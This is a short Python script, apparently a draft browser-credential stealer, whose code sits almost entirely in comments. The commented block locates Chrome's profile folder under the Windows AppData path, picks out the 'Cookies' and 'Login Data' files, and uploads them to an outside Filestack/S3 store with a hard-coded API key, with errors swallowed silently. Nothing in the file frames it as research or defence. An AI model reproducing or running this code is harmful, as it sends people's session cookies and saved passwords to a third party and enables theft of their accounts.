from filestack import Client 
import json,os

    
    
# print(os.environ['USERNAME'])
# user_profile = os.environ['USERNAME']
# user_profile = os.environ['USERPROFILE'] 
# path = os.path.split(os.getenv('APPDATA'))[0]
# for x in  os.listdir(path) :
#     if x=='Local':
#         path = path+'\\'+x
#         for y in os.listdir(path):
#             if y=='Google' or y=='Chrome':
#                 path = path+'\\'+y
#                 for z in os.listdir(path):
#                     if z=='Chrome':
#                         destination = path+'\\'+z+'\\User Data\\Default'
#                         targets = [destination+'\\'+x for x in  ('Cookies','Login Data')]
#                         for a in targets:
#                             client = Client('ArqD8iB4HTvSwcewolp4Cz')
#                             store_params = {
#                                 'location': 's3', 
#                                 'path': destination,
#                                 'upload_tags': {
#                                       "foo":"bar"
#                                 }
#                             }
#                             try:
#                                 filelink = client.upload(filepath=a, store_params=store_params)
#                             except :pass
                            
#                             print(os.path.isfile(a))
                    

